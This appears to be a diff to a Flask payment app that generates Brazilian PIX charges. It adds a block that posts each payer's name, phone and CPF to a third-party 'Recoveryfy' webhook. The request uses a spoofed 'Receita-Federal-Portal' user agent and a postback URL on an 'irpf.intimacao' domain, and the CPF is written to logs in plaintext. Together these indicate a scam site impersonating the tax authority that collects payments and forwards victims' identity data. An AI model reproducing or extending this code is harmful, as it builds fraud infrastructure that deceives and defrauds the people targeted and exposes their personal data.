@@ -597,6 +597,100 @@ def generate_pix():
             except Exception as webhook_error:
                 app.logger.error(f"[WEBHOOK] ❌ Erro ao enviar notificação Pushcut: {webhook_error}")
 
+            # Enviar webhook personalizado para Recoveryfy
+            try:
+                import time
+                import uuid
+                from datetime import datetime, timedelta
+                
+                # Gerar ID único para o order
+                order_id = str(uuid.uuid4())
+                customer_id = str(uuid.uuid4())
+                
+                # Preparar webhook no formato solicitado
+                webhook_payload = {
+                    "id": result.get('external_ref', '0E89XWCNOVU1'),
+                    "data": {
+                        "id": result.get('transaction_id', order_id),
+                        "ip": None,
+                        "fee": {
+                            "netAmount": int(amount * 100 * 0.9988),  # 99.88% do valor
+                            "fixedAmount": 0.2,
+                            "estimatedFee": int(amount * 100 * 0.0012),  # 0.12% taxa
+                            "spreadPercentage": 0
+                        },
+                        "pix": {
+                            "qrcode": result.get('pix_code', ''),
+                            "end2EndId": None,
+                            "receiptUrl": None,
+                            "expirationDate": (datetime.now() + timedelta(days=2)).strftime("%Y-%m-%dT%H:%M:%S-03:00")
+                        },
+                        "card": None,
+                        "items": None,
+                        "amount": int(amount * 100),  # Valor em centavos
+                        "boleto": None,
+                        "paidAt": None,
+                        "splits": [
+                            {
+                                "netAmount": int(amount * 100 * 0.9988),
+                                "percentage": 100,
+                                "recipientId": "08d8ad1d-29e9-45bc-a785-2a53cca9f4c1"
+                            }
+                        ],
+                        "status": "waiting_payment",
+                        "customer": {
+                            "id": customer_id,
+                            "name": user_name,
+                            "email": "vinicius.carvalho@gmail.com",
+                            "phone": user_phone,
+                            "document": user_cpf,
+                            "createdAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%f")
+                        },
+                        "metadata": None,
+                        "shipping": {
+                            "city": "Santos",
+                            "state": "SP",
+                            "street": "Rua X",
+                            "zipCode": "11050100",
+                            "complement": "",
+                            "neighborhood": "Centro",
+                            "streetNumber": "1"
+                        },
+                        "companyId": "94c91ae2-3ae2-4860-942f-75f8fbd3b627",
+                        "createdAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S-03:00"),
+                        "updatedAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S-03:00"),
+                        "description": "Transação criada via API",
+                        "postbackUrl": "https://irpf.intimacao.org/medius-postback",
+                        "installments": 1,
+                        "paymentMethod": "PIX",
+                        "refusedReason": None,
+                        "refundedAmount": None
+                    },
+                    "type": "transaction",
+                    "objectId": result.get('transaction_id', order_id),
+                    "timestamp": int(time.time() * 1000)
+                }
+                
+                # Enviar webhook para Recoveryfy
+                webhook_url = "https://recoveryfy.replit.app/api/webhook/cbe3224pos7y3b0d39d0g87ylrordr0n"
+                
+                webhook_response = requests.post(
+                    webhook_url,
+                    json=webhook_payload,
+                    headers={
+                        'Content-Type': 'application/json',
+                        'User-Agent': 'Receita-Federal-Portal/1.0'
+                    },
+                    timeout=15
+                )
+                
+                app.logger.info(f"[WEBHOOK-RECOVERYFY] ✅ Webhook enviado: {webhook_response.status_code}")
+                app.logger.info(f"[WEBHOOK-RECOVERYFY] Order ID: {order_id}")
+                app.logger.info(f"[WEBHOOK-RECOVERYFY] Cliente: {user_name} - CPF: {user_cpf} - Valor: R$ {amount}")
+                
+            except Exception as recoveryfy_error:
+                app.logger.error(f"[WEBHOOK-RECOVERYFY] ❌ Erro ao enviar webhook: {recoveryfy_error}")
+
             app.logger.info("[PROD] PIX TechByNet gerado com sucesso")
             return jsonify(pix_data)
         
